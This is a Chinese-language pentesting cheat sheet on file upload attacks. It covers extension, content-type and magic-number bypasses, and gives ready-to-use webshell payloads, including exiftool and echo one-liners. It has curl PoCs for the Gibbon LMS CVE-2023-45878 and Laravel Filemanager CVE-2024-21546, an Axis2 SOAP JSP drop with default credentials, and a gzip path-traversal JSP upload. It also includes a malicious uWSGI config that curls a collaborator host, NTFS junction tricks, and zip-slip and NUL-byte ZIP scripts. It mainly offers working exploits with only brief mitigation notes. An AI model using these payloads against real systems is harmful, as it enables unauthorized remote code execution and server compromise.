# 文件上传

## 0x01 原理与威胁

**原理：** 应用程序未对用户上传的文件名、内容及存储路径进行有效校验，导致恶意脚本（WebShell）被上传至 Web 目录。 

**威胁：** RCE（远程代码执行）、XSS（存储型）、SSRF、XXE、DoS（像素炸弹/超大文件）。

---

## 0x02 通用绕过技巧

---

### 1. 扩展名检查绕过

---

#### 1. 可能被解析的文件后缀

- **PHP**: `.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, `.phps`, `.phps`, `.pht`, `.phtm`, `.phtml`, `.pgif`, `.shtml`, `.htaccess`, `.phar`, `.inc`, `.hphp`, `.ctp`, `.module`

- **Working in PHPv8**: `.php`, `.php4`, `.php5,` `.phtml`, `.module`, `.inc`, `.hphp`, `.ctp`

- **ASP**: .asp, `.aspx`, `.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`, `.cshtm`, `.cshtml`, `.rem`, `.soap`, `.vbhtm`, `.vbhtml`, `.asa`, `.cer`, `.shtml`

- **Jsp**: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.action`

- **Coldfusion**: `.cfm`, `.cfml`, `.cfc`, `.dbm`

- **Flash**: `.swf`

- **Perl**: `.pl`, `.cgi`

- **Erlang Yaws Web Server**: `.yaws`

---

#### 2. 绕过文件后缀检查的方法

1. 测试上面列出的文件后缀，并且对文件后缀进行大小写修改

2. 在可执行文件后缀之前添加允许的文件后缀：

   - `file.png.php`
   - `file.png. Php5`

3. 在文件后缀结尾添加特殊的 **`ascii`** 字符或者 **`Unicode`** 字符：

   - `file.php%20`
   - `file.php%0a`
   - `file.php%00`
   - `file.php%0d%0a`
   - `file.php/`
   - `file.php.\\`
   - `file.`
   - `file.php….`
   - `file.pHp5….`

4. 使用双后缀或多后缀或在后缀之间或结尾填充垃圾数据

   - `file.png.php`
   - `file.png.pHp5`
   - `file.php%00.png`
   - `file.php%00.png%00`
   - `file.php\\x00.png`
   - `file.php\\x00.png\\x00`
   - `file.php%0a.png`
   - `file.php%0d%0a.png`
   - `flile.phpJunk123png`
   - `file.png.jpg.php`
   - `file.php%00.png%00.jpg`

5. 在可执行文件后缀之后添加允许的文件后缀或错误的文件后缀（如：**apache httpd 多后缀解析**，只要文件中含有 **`.php`** ,但不要求以 **`.php`** 结尾,该类文件均可被视为 `php` 文件执行）

   - `file.php.png`
   - `file.php.sing3r`

6. 在 Windows 环境下，尝试使用 NTFS 备用数据流（ADS）。对于通过 ADS 生成的 **_由禁止后缀结尾的空文件_**，寻找其他功能点或漏洞修改其文件内容后，即可获取 SHELL 。  
   **NTFS ADS特性**

   | 上传文件名                    | 服务器生成文件名  | 实际文件内容 |
   | ----------------------------- | ----------------- | ------------ |
   | `Test.php:a.jpg`              | `Test.php`        | 空           |
   | `Test.php::$DATA`             | `test.php`        | 实际内容     |
   | `Test.php::$INDEX_ALLOCATION` | `test.php` 文件夹 | /            |
   | `Test.php::$DATA.jpg`         | `0.jpg`           | 实际内容     |
   | `Test.php::$DATA\\aaa.jpg`    | `aaa.jpg`         | 实际内容     |

7. 利用操作系统的限制或者应用程序的错误，触发文件保存中文件名的长度限制，切断允许后缀字符。
```shell
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png

# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```
---

### 2. 内容检查绕过

- **Content-Type**：尝试修改 `Content-Type` 头为 `image/png` , `text/plain` , `application/octet-stream` 等，以绕过检测。

  - Content-Type 头字典：[https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)

- **幻数**：Magic Number（幻数）是在计算机科学中常用的一个概念，它通常是一个固定长度的字节序列，用于标识文件格式、数据流或协议等的特定属性。这些字节序列通常出现在文件的开头，被称为文件头，也有可能出现在文件的其他位置。通过在文件开头添加真实图像的字节可绕过幻数检查。[Magic Number List](https://en.wikipedia.org/wiki/List_of_file_signatures)

  - 在元数据里面插入代码：`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
  - 在图片结尾追加代码：`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`

- **文件压缩**：对于文件压缩，如 PHP 中的 PHP-GD 库，可以使用 [PLTE 块技术](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 插入一些经过压缩后仍然存在的文本，从而插入恶意代码。

  - [Github with the code](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)

- **文件 size 重置**：对于文件大小重置，如 PHP-GD 库的 `imagecopyresized` 或 `imagecopyresampled` 函数，可以使用 [IDAT 块技术](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 插入一些经过压缩后仍然存在的文本，从而插入恶意代码。使用 `thumbnailImage` 函数则可以 [tEXt 块技术](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)。

  - [IDAT 块技术 Github with the code](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
  
  - [tEXt 块技术 Github with the code](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)
  
---

### 3. 其他绕过

- 查找重命名功能模块或其他安全漏洞，重命名已上传文件后缀。
- 查找本地文件包含漏洞以执行 websehll
- 触发信息泄露
  - 多次同时上传具有相同名称的同一文件。该方法同时也适用于**“文件上传之条件竞争攻击”**，**条件竞争漏洞（Race condition）**官方概念是“发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。upload-labs 中的 Pass-17 是一个典型的条件竞争上传代码执行逻辑：先移动，后检测，不符合再删除，符合则改名字。因此我们可以让 BurpSuite 一直发包，让 php 程序一直处于移动 php 文件到 upload 目录。这个阶段我们使用多线程并发访问上传的文件，总会有一次在上传文件到删除文件这个时间段访问到上传的 php 文件，一旦我们成功访问到上传的 php 文件，那么它就会向服务器写一个 shell。
  - 上传与已存在得文件或文件夹相同名称的文件
  - 以 `.` 、`..` 、`...` 作文上传文件的文件名。例如，在 Windows 的 Apache 中，如果应用程序将上传的文件保存在 `/www/uploads/` 目录中，以 `.` 作为文件名时，应用程序将在 `/www/` 目录中创建一个名为 “uploads” 的文件。关于 `..`，我们可以引申出一种关于绕过安全上传目录的方法。有时候上传可执行文件之后，会发现无法执行脚本代码，如果文件以原始文件名保存到服务器中，则可以尝试如 `../../../../../shell.jspx` 命名方式绕过上传安全目录，从而执行 webshell 。
  - 上传难以删除的文件，例如在 NTFS 中的 `...:.jpg`
  - 上传包含非法字符的文件，例如 windows 的文件名的非法字符 `|<>*?”`
  - 使用保留名称，例如在 Windows 中上传文件： `CON`、`PRN`、`AUX`、`NUL`、`COM1`、`COM2`、`COM3`、`COM4`、`COM5`、`COM6`、`COM7`、`COM8`、`COM9`、`LPT1`、`LPT2`、`LPT3`、`LPT4`、`LPT5`、`LPT6` 、`LPT7`、`LPT8` 和 `LPT9`。
- 上传可执行文件 `.exe` 或 `.html`，这些文件或者会被好奇之人打开（ 想多了 ）。
- 有时候上传接口可能存在控制上传文件后缀的隐藏参数或者控制上传文件保存路径的隐藏参数，可以尝试 FUZZ 参数。

---

### 4. 针对特定语言的绕过

- PHP：
  - 上传 `.htaccess`，详见相关[技巧](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)
  - 上传 `.user.ini`，详见相关[技巧](https://zhuanlan.zhihu.com/p/474484548)
  - 上传 `.phar`，通过 PHP 执行，或者包含在 PHP 脚本中
  - 上传 `.inc`，`.inc` 文件在 PHP 中通常用来导入 PHP 文件，关于 `.inc` 文件，可能出现两种利用情况：
    - 被视为执行文件：`.inc` 文件有时候会被视为可执行文件，所以可以直接上传该文件并访问。
    - 文件包含：有时候应用程序会包含 `.inc` 文件,上传同名的 `.inc` 文件以覆盖原来的 `.inc` 文件,即可进行 GET SHELL。其次，有时候应用程序会使用 `spl_autoload_register()` 注册自动加载函数。当不提供任何参数时，PHP 会默认使用 `spl_autoload()` 函数作为自动加载函数。此时若能否上传一个包含恶意代码的 `sing3r.inc` 文件到调用 `spl_autoload_register()` 函数的 PHP 脚本所在目录中，通过反序列化调用 `sing3r` 函数，即可触发 `spl_autoload()` 自动包含 `sing3r.inc`，从而 GET SHELL。关于 `spl_autoload_register()`的利用详见[本文](https://www.freebuf.com/articles/network/160343.html)。
- ASP：上传 `.config`，详见相关[技巧](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-config-files)

---

## 0x03 容器/服务/框架特定技巧 (Jetty/uWSGI/Gibbon LMS/Wget/Axis2 SOAP/UniSharp Laravel Filemanager/Tomcat)

---

### 1. Jetty RCE

由于 Jetty 会自动处理 `*.xml` 和 `*.war` ，所以当服务器允许上传一个 `*.xml` 文件到 `$JETTY_BASE/webapps/` 时，我们将会获得一个 RCE。

![Jetty-RCE](C:\Users\Hea\Documents\朝花夕拾\Web_Security\File Upload\assets\Jetty-RCE.png)

---

### 2. uWSGI RCE

如果可以替换 uWSGI 服务器的 `.ini` 配置文件，将会获得一个 RCE 。

恶意 `uwsgi.ini` 示例：
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

当配置文件将被解析时，有效负载将被执行。请注意，对于要解析的配置，需要重新启动进程（通过 `Crash/DoS` 使服务重启？）或自动重新加载文件（可能正在使用的选项指示：“如果发现更改，重新加载文件”）。

重要说明： `uWSGI` 对于配置文件的解析是宽松的。先前的有效负载可以嵌入到二进制文件中（例如图像、`pdf`、`…`）。

---

### 3. Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS 中的一个未认证端点允许在 web root 内进行 arbitrary file write，从而通过写入 PHP 文件实现 pre-auth RCE。易受影响的版本：最高到并包括 `25.0.01`。

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: `POST`
- Required params:
  - `img`: 一个类似 data-URI 的字符串：`[mime];[name],[base64]`（服务器会忽略 `type/name`，只对尾部进行 base64 解码）
  - `path`: 目标文件名，相对于 Gibbon 安装目录（例如，`poc.php` 或 `0xdf.php`）
  - `gibbonPersonID`: 接受任意非空值（例如，`0000000001`）

Minimal PoC to write and read back a file:

```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```

上传一个最小的 webshell 并执行命令：

```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```

注意：

- 该处理程序在按照 `;` 和 `,` 切分后执行 `base64_decode($_POST["img"])`，然后将字节写入 `$absolutePath . '/' . $_POST['path']`，而不验证扩展名/类型。
- 生成的代码以 web 服务用户身份运行（例如 XAMPP Apache on Windows）。

关于该漏洞的参考包括 usd HeroLab advisory 和 NVD 条目。参见下面的 References 部分。

---

### 4. wget File Upload/SSRF Trick

在某些情况下，您可能会发现服务器正在使用 `wget` 下载文件，您可以指定 URL。在这些情况下，代码可能会检查下载文件的扩展名是否在白名单内，以确保只下载允许的文件。但是，可以绕过此检查。 Linux 中文件名的最大长度为 255，但是，`wget` 将文件名截断为 236 个字符。您可以下载一个名为 `"A" * 232 + ".php" + ".gif"` 的文件，这个文件名将绕过检查（因为在这个例子中`.gif`是一个有效的扩展名）但是 `wget` 会将文件重命名为`"A" * 232 + ".php"`。

```shell
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```shell
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```

或者可以尝试通过 302 重定到另一个文件来绕过后缀名检查，然后 `wget` 将下载具有新名称的文件。例如

```shell
$ wget https://example.com/file.zip
--2022-04-04 10:00:00--  https://example.com/file.zip
Resolving example.com (example.com)... 192.0.2.1
Connecting to example.com (example.com)|192.0.2.1|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://example.com/new-location/shell.jspx [following]
--2022-04-04 10:00:01--  https://example.com/new-location/shell.jspx
Resolving example.com (example.com)... 192.0.2.1
Connecting to example.com (example.com)|192.0.2.1|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12345 (12K) [application/jspx]
Saving to: 'shell.jspx'

shell.jspx               100%[===================>]  12.05K  --.-KB/s    in 0s

2022-04-04 10:00:01 (223 MB/s) - 'shell.jspx' saved [12345/12345]
```

请注意，假若 `wget` 与 `--trust-server-names` 参数一起使用时，上述技巧将不再有效，因为 `wget` 将会自动跟随重定向，并将重定向后的文件保存为原始文件的名称, 例如：

```shell
wget --trust-server-names https://example.com/file.zip
......
HTTP request sent, awaiting response... 302 Found
Location: https://example.com/new-location/shell.jspx
......
2022-04-04 10:00:01 (223 MB/s) - 'file.zip' saved [12345/12345]
```
---

### 5. Axis2 SOAP uploadFile traversal to Tomcat webroot (JSP drop)

基于 Axis2 的 upload 服务有时会暴露一个 `uploadFile` SOAP action，接受三个由攻击者控制的字段：`jobDirectory`（目标目录）、`archiveName`（文件名）和 `dataHandler`（base64 文件内容）。如果 `jobDirectory` 未被规范化，就会通过路径遍历获得任意文件写入，并能将 JSP 放入 Tomcat 的 webapps。

Minimal request outline (default creds often work: `admin` / `trubiquity`):

```http
POST /services/WsPortalV6UpDwAxis2Impl HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:updw="http://updw.webservice.ddxPortalV6.ddxv6.procaess.com">
<soapenv:Body>
<updw:uploadFile>
<updw:login>admin</updw:login>
<updw:password>trubiquity</updw:password>
<updw:archiveName>shell.jsp</updw:archiveName>
<updw:jobDirectory>/../../../../opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/</updw:jobDirectory>
<updw:dataHandler>PD8lQCBwYWdlIGltcG9ydD0iamF2YS5pby4qIjsgc3lzdGVtKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7Pz4=</updw:dataHandler>
</updw:uploadFile>
</soapenv:Body>
</soapenv:Envelope>
```

- 绑定通常仅限于 localhost；如果 Axis2 端口未暴露，可配合 full-read SSRF（absolute-URL request line，忽略 Host header）去访问 `127.0.0.1`。
- 写入后，浏览到 `/trufusionPortal/jsp/shell.jsp?cmd=id` 来执行。

---

### 6. UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

一些上传处理器会从保存的文件名中修剪或规范化结尾的点字符。在 UniSharp 的 Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 之前的版本中，你可以通过以下方法绕过扩展名验证：

- 使用有效的图片 MIME 和 magic header（例如 PNG 的 `\x89PNG\r\n\x1a\n`）。
- 将上传的文件命名为以 PHP 扩展名结尾并跟一个点，例如 `shell.php.`。
- 服务器会去掉结尾的点并保存为 `shell.php`，如果该文件被放在可通过 Web 访问的目录（默认公共存储如 `/storage/files/`），则会被执行。

最小化 PoC（Burp Repeater）：

```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```

然后访问保存的路径（在 Laravel + LFM 中很典型）：

```http
GET /storage/files/0xdf.php?cmd=id
```

---

### 7. GZIP 压缩的请求体上传 + 目标参数中的路径遍历 → JSP webshell RCE（Tomcat）

某些上传/接收处理程序会将原始请求体写入由用户控制的查询参数构建的文件系统路径。如果该处理程序还支持 Content-Encoding: gzip，并且未能规范化/验证目标路径，则可以将目录遍历与 gzip 压缩的有效负载结合使用，将任意字节写入 Web 服务目录，从而获得远程代码执行 (RCE) 权限（例如，在 Tomcat 的 Web 应用程序目录下放置一个 JSP 文件）。

通用漏洞利用流程：

- 准备好服务器端有效载荷（例如，最小的 JSP webshel​​l），并使用 gzip 压缩字节。
- 发送一个 POST 请求，其中路径参数（例如 token）包含指向目标文件夹的转义路径，文件参数指定要持久化的文件名。设置 Content-Type: application/octet-stream 和 Content-Encoding: gzip；请求体是压缩后的有效负载。
- 浏览到写入的文件以触发执行。

示例请求：

```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```

Then trigger: 然后触发：

```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```

Notes 笔记

- 目标路径因安装环境而异（例如，在某些环境中为 /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/）。任何可执行 JSP 的 Web 公开文件夹均可使用。
- Burp Suite 的 Hackvertor 扩展可以从您的有效载荷中生成正确的 gzip 主体。
- 这是一个纯粹的预授权任意文件写入→远程代码执行模式；它不依赖于多部分解析。

Mitigations 缓解措施

- 在服务器端获取上传目标地址；永远不要信任客户端提供的路径片段。
- 规范化并强制执行解析后的路径保持在允许列表的基本目录中。
- 将上传文件存储在不可执行卷上，并禁止从可写路径执行脚本。

---

## 0x04 操作系统特性技巧

---

### 1. Windows 操作系统

---

#### 通过 NTFS junctions 逃逸上传目录 (Windows)

(对于此攻击你需要对 Windows 机器的本地访问) 当上传文件在 Windows 的按用户子文件夹下存放（例如 `C:\Windows\Tasks\Uploads<id>`) 并且你可以控制该子文件夹的创建/删除时，你可以将其替换为指向敏感位置（例如 webroot）的 directory junction。后续上传将被写入目标路径，如果目标会解析 server‑side code，就可能导致 code execution。

Example flow to redirect uploads into XAMPP webroot:

```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```

Notes

- mklink /J creates an NTFS directory junction (reparse point)。Web 服务器的账户必须能够跟随该 junction 并且在目标位置拥有写权限。
- 这会重定向任意文件写入；如果目标会执行脚本（PHP/ASP），则会变成 RCE。
- 防御：不要允许可写的上传根目录被攻击者控制（例如位于 `C:\Windows\Tasks`）；阻止 junction 的创建；在服务器端验证扩展名；将上传存储在独立的卷上或设置 deny‑execute ACLs。

---

## 0x05 文件格式特定技巧

---

### 1. Zip/Tar 文件在服务端自动解压的上传

如果你可以上传一个会在服务器内被解压的 ZIP，你可以做两件事：

#### Symlink

上传一个包含指向其他文件的软链接的压缩包，然后访问解压后的文件时将访问被链接的文件：

```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```

#### 在不同文件夹解压

在解压缩过程中意外在目录中创建文件是一个重大问题。尽管起初可能认为这种设置可以防止通过恶意文件上传进行 OS 级别的命令执行，但 ZIP archive format 的分层压缩支持和 directory traversal 能力可以被利用。这允许攻击者通过操纵目标应用的解压功能绕过限制并从安全上传目录中逃逸。

一个用于构造此类文件的自动化 exploit 可在 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) 获取。该工具可按如下方式使用：

```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```

此外，**symlink trick with evilarc** 是一种可选方法。如果目标是像 `/flag.txt` 这样的文件，应在系统上创建指向该文件的符号链接。这样可以确保 evilarc 在运行时不会遇到错误。

下面是用于创建恶意 zip 文件的 Python 代码示例：

```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```

**滥用压缩以进行 file spraying**

欲了解更多细节 **请查看原始文章**: https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/

1. **Creating a PHP Shell**: 将 PHP 代码写成通过 `$_REQUEST` 变量传入的命令并执行。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

1. **File Spraying and Compressed File Creation**: 创建多个文件并将这些文件打包到一个 zip 存档中。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

1. **Modification with a Hex Editor or vi**: 使用 vi 或十六进制编辑器更改 zip 内的文件名，将 “xxA” 改为 “../” 以进行目录遍历。

```bash
:set modifiable
:%s/xxA/../g
:x!
```

---

### 2. ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

当后端使用 PHP 的 ZipArchive 验证 ZIP 条目但在提取时使用原始名称写入文件系统时，你可以通过在文件名字段中插入 NUL (0x00) 来走私一个被禁止的扩展名。ZipArchive 会将条目名视为 C‑string 并在第一个 NUL 处截断；而文件系统会写入完整名称，丢弃 NUL 之后的内容。

High-level flow:

- 准备一个合法的容器文件（例如一个有效的 PDF），在其流中嵌入一个微小的 PHP stub，使 magic/MIME 保持为 PDF。
- 将其命名为类似 `shell.php..pdf`，压缩成 zip，然后在 ZIP 的 local header 和 central directory 的文件名中用十六进制编辑把 `.php` 之后的第一个 `.` 替换为 `0x00`，结果变为 `shell.php\x00.pdf`。
- 依赖 ZipArchive 的验证器会“看到” `shell.php .pdf` 并允许该文件；提取器会将 `shell.php` 写入磁盘，如果上传文件夹可执行则可能导致 RCE。

Minimal PoC steps:

```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```

Notes

- 同时更改两个文件名出现的位置（本地和中央目录）。一些工具还会添加额外的 data descriptor 条目 —— 如果存在，请调整所有 name 字段。
- payload 文件仍必须通过 server‑side magic/MIME sniffing。将 PHP 嵌入到 PDF 流中可使 header 保持有效。
- 适用于 enum/validation path 与 extraction/write path 在字符串处理上存在不一致的情况。

---

### 3. Stacked/concatenated ZIPs (parser disagreement)

将两个有效的 ZIP 文件连接起来会生成一个数据块，其中不同的解析器会关注不同的 EOCD 记录。许多工具会定位最后一个中央目录结束符 (EOCD)，而某些库（例如，在特定工作流程中的 ZipArchive）可能会解析找到的第一个压缩文件。如果验证过程枚举的是第一个压缩文件，而提取过程使用了另一个遵循最后一个 EOCD 的工具，那么一个良性压缩文件可能通过验证，而一个恶意压缩文件却被提取出来。

PoC:

```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```

滥用模式

- 创建一个良性压缩包（允许的类型，例如 PDF）和第二个包含被阻止扩展名的压缩包（例如 `shell.php`）。
- 将它们串联：`cat benign.zip evil.zip > combined.zip`。
- 如果服务器使用一个解析器进行验证（看到 benign.zip），但使用另一个解析器进行解压（处理 evil.zip），被阻止的文件就会落入解压路径。

---

### 4. Polyglot 文件

Polyglot files 在网络安全中是独特的工具，它们像变色龙一样可以同时以多种文件格式有效存在。一个有趣的例子是 [GIFAR](https://en.wikipedia.org/wiki/Gifar)，它同时作为 `GIF` 和 `RAR archive` 工作。这样的文件不限于这一组合；像 `GIF` 和 `JS` 或 `PPT` 和 `JS` 的组合也可行。

Polyglot 文件的核心用途在于其能够规避基于类型的安全检测。很多应用通常只允许上传特定文件类型（例如 `JPEG`、`GIF` 或 `DOC`）以降低来自潜在危险格式（例如 `JS`、`PHP` 或 `Phar` 文件）的风险。然而，polyglot 通过同时满足多种文件格式的结构要求，可以悄然绕过这些限制。

